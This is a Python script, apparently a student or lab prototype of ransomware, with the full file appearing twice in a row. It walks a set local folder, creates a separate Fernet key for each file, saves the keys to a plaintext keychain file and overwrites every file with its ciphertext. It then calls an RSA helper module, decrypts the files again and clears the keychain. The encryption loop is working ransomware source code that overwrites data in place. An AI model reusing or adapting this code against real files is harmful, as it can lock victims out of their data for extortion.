# from Crypto.Cipher import AES
# from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet

from os import listdir
from os.path import isfile, join
import tsetrsa


mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"

def get_key(): 
    return Fernet.generate_key()  # key generation

def append_to_keychain(file,key):
    global keychain_path
    encoded = file.encode()
    print("encoded - ",encoded)
    with open(keychain_path, 'ab') as keychain:
        keychain.write(encoded +b":" + key + b"\n")

def extract_key_from_keychain(file):
    bin_filename = bytes(file,'utf-8')
    with open(keychain_path, 'rb') as keychain:
        for line in keychain:
            if line.startswith(bin_filename):
                target =  line.split(b':')[1]
                return target.split(b'\n')[0]
        

    print("didnt find, sorry")
         


def encrypt_files():
    global mypath
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files
     
    for file in files_list: 
        key = get_key()
        append_to_keychain(file,key)
        fernet = Fernet(key)   # using the generated key     
        with open(file, 'rb') as opened_file:    # opening the original file to encrypt
            original = opened_file.read()  
            encrypted = fernet.encrypt(original)  # encrypting the file
 
        with open(file, 'wb') as encrypted_file:   # opening the file in write mode and
            encrypted_file.write(encrypted)     # writing the encrypted data
            
            
            
def decrypt():     
    global mypath
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files  
    for file in files_list:   
        key = extract_key_from_keychain(file)
        print("key_extrated - ",key)
        fernet = Fernet(key)
             
        with open(file, 'rb') as enc_file:   # opening the encrypted file
            encrypted = enc_file.read()
        
        decrypted = fernet.decrypt(encrypted) # decrypting the file
        
        with open(file, 'wb') as dec_file:   # opening the file in write mode and writing the decrypted data
            dec_file.write(decrypted)


def empty_keychain():
        with open(keychain_path, 'wb') as keychain:
            keychain.write(b"")
            

def main():
     encrypt_files()
     tsetrsa.encrypt_rsa()
     tsetrsa.decrypt_rsa()
     decrypt()
     empty_keychain() 


if __name__=="__main__":
    main()
# from Crypto.Cipher import AES
# from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet

from os import listdir
from os.path import isfile, join
import tsetrsa


mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"

def get_key(): 
    return Fernet.generate_key()  # key generation

def append_to_keychain(file,key):
    global keychain_path
    encoded = file.encode()
    print("encoded - ",encoded)
    with open(keychain_path, 'ab') as keychain:
        keychain.write(encoded +b":" + key + b"\n")

def extract_key_from_keychain(file):
    bin_filename = bytes(file,'utf-8')
    with open(keychain_path, 'rb') as keychain:
        for line in keychain:
            if line.startswith(bin_filename):
                target =  line.split(b':')[1]
                return target.split(b'\n')[0]
        

    print("didnt find, sorry")
         


def encrypt_files():
    global mypath
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files
     
    for file in files_list: 
        key = get_key()
        append_to_keychain(file,key)
        fernet = Fernet(key)   # using the generated key     
        with open(file, 'rb') as opened_file:    # opening the original file to encrypt
            original = opened_file.read()  
            encrypted = fernet.encrypt(original)  # encrypting the file
 
        with open(file, 'wb') as encrypted_file:   # opening the file in write mode and
            encrypted_file.write(encrypted)     # writing the encrypted data
            
            
            
def decrypt():     
    global mypath
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files  
    for file in files_list:   
        key = extract_key_from_keychain(file)
        print("key_extrated - ",key)
        fernet = Fernet(key)
             
        with open(file, 'rb') as enc_file:   # opening the encrypted file
            encrypted = enc_file.read()
        
        decrypted = fernet.decrypt(encrypted) # decrypting the file
        
        with open(file, 'wb') as dec_file:   # opening the file in write mode and writing the decrypted data
            dec_file.write(decrypted)


def empty_keychain():
        with open(keychain_path, 'wb') as keychain:
            keychain.write(b"")
            

def main():
     encrypt_files()
     tsetrsa.encrypt_rsa()
     tsetrsa.decrypt_rsa()
     decrypt()
     empty_keychain() 


if __name__=="__main__":
    main()

